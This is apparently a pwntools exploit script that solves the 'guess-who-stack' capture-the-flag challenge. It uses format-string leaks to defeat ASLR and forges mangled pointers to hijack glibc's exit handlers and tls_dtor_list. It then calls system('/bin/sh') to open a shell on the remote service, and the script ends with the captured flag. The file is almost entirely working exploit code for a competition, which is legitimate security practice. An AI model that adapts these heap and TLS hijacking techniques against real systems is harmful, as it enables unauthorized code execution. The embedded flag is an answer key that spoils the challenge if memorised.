#!/usr/bin/env python3
from pwn import *
sys.tracebacklimit = 4
context(endian = "little", encoding='utf-8') # arch='amd64'
context.terminal = ["tmux", "splitw", "-h"]
const = constants

# quick functions
def pwninit():
    ELF.base = ELF.address
    tube.s = tube.send
    tube.sa = tube.sendafter
    tube.sl = tube.sendline
    tube.sla = tube.sendlineafter
    tube.rcu = tube.recvuntil
    pass
pwninit()

libc_path = 'libc.so.6'
exe_path = args.EXE or './chal'
exe = context.binary = ELF(exe_path, checksec=False)
with context.silent:
    if exe.arch not in ['amd64', 'i386'] or (args.REMOTE and libc_path):
        libc = ELF(libc_path, checksec=False)
    elif libc := exe.libc: libc.address = 0
    pass

BAD_CHARS = string.whitespace.encode()

def u64(b): return packing.u64(b.ljust(8, b'\0'))

def log_leak(**kwargs):
    for name, value in kwargs.items():
        info(f"LEAK: {name:16} = {value:#x}")

def log_calc(**kwargs):
    for name, value in kwargs.items():
        info(f"CALC: {name:16} = {value:#x}")

def gdb_pause(interactive=False):
    if args.REMOTE: return
    d = r.clean(0.1)
    pid = r.pid if hasattr(r, 'pid') else -1
    input(f'gdb {pid}')
    if interactive: r.interactive()
    r.unrecv(d)

def conn(argv=[], ssl=False):
    if args.REMOTE:
        r = remote(host, int(port), ssl=args.SSL or ssl)
    elif args.DOCKER:
        r = remote('localhost', int(1337))
    elif args.GDB:
        r = gdb.debug(argv or [exe_path], exe=exe_path, gdbscript=gdbscript)
    else:
        r = process(argv or [exe_path])
    return r

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

if libc:
    libc.sym['binsh'] = next(libc.search(b'/bin/sh\0'))
    libc.sym['trap'] = next(libc.search(b'\xcc', executable=True))

def rol_u64(num: int, shift: int) -> int:
    """Rotate a 64-bit unsigned integer left by `shift` bits."""
    shift %= 64  # Ensure shift is within 0-63
    u64max = (1<<64) - 1
    return ((num << shift) | (num >> (64 - shift))) & u64max

def ptr_mangle(addr, key):
    return rol_u64(addr ^ key, 17)

def cast_i64(num):
    """Convert a Python int to a 64-bit signed integer (i64)."""
    return ((num + (1 << 63)) % (1 << 64)) - (1 << 63)

assert cast_i64((1 << 63) + 5) == -0x7ffffffffffffffb

x = 0x123456789ABCDEF0  # 64-bit value
rotated = rol_u64(x, 4)
assert rotated == 0x23456789ABCDEF01, hex(rotated)

def leak_hex_fmt(n):
    r.sla('...', f'%{n}$p')
    r.rcu('heavy ')
    leak = int(r.recvline(), 16)
    return leak

# val0 will be auto-mangled by this func
def write_two(a, val0, b, val1, guard=0):
    r.sla('... ', f'{b} {val1}')
    mangled = cast_i64(ptr_mangle(val0, guard))
    r.sla('... ', f'{a} {mangled}')
    pass

nc_args = ('ncat --ssl guess-who-stack.harkonnen.b01lersc.tf 8443').split()
host, port = nc_args[-2:]

r = conn(ssl=True)
def main():
    main_ret = leak_hex_fmt(13)
    log_leak(main_ret=main_ret)

    libc.base = main_ret - (libc.libc_start_main_return)
    assert libc.base & 0xfff == 0
    log_calc(libc=libc.base)

    # cannot overwrite rtld due to glibc 2.38 > required 2.34
    tls_address = libc.base - 0x28c0
    ptr_guard_addr = tls_address + 0x30

    """
    https://elixir.bootlin.com/glibc/glibc-2.38.9000/source/stdlib/exit.c#L111
    pwndbg> p &cur->fns[0]->func.cxa.fn
    $33 = (void (**)(void *, int)) 0x7fc908c001b8 <initial+24>
    """
    func_0 = libc.sym.initial + 24
    func_0_arg = libc.sym.initial + 32
    log_calc(func_0=func_0, ptr_guard=ptr_guard_addr)

    """
    0x00007fe62f4451a4      111                   cxafct (arg, status);
    pwndbg> regs rdi rsi rdx
     RDI  0
    *RSI  0
     RDX  1
    """
    # restart main
    add_rsp_158_ret = libc.base + 0xdb0b1 # add rsp, 0x0000000000000128 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    write_two(func_0, add_rsp_158_ret, ptr_guard_addr, 0)

    # func_0->flavor = ef_free (set by exit()), which does nothing in the next run.
    # also initial->idx (count) is zero.
    # use tls_dtor_list
    # https://elixir.bootlin.com/glibc/glibc-2.38.9000/source/stdlib/cxa_thread_atexit_impl.c#L147
    tls_dtor_list = tls_address - 0x50
    log_calc(tls_dtor_list=tls_dtor_list)

    pie_start = leak_hex_fmt(17) # _start
    log_leak(_start=pie_start)
    exe.base = pie_start - exe.sym._start
    assert exe.base & 0xfff == 0

    # libc_argv == libc.bss(0)
    fake_dtor = libc.bss(-0x18)
    write_two(fake_dtor, exe.sym.main, tls_dtor_list, fake_dtor)

    # now tls_dtor_list = libc_argv
    # leak stack and do system /bin/sh
    # gdb_pause()
    stack_leak = leak_hex_fmt(6)
    log_leak(stack_leak=stack_leak)

    pie_argv = stack_leak + 0x158
    fake_dtor1 = pie_argv
    fake_dtor1_obj = pie_argv + 8
    write_two(fake_dtor1, libc.sym.system, fake_dtor1_obj, libc.sym.binsh)
    r.clean(0.5)
    # bctf{th3_m0m3nt_you_0wn_1t_n3ver_l3t_1t_g0_93ae4ae4d96b}
    pass

try:
    main()
    if hasattr(r, 'pid'): print(f'pid = {r.pid}')
    r.interactive()
except Exception as exc:
    raise exc

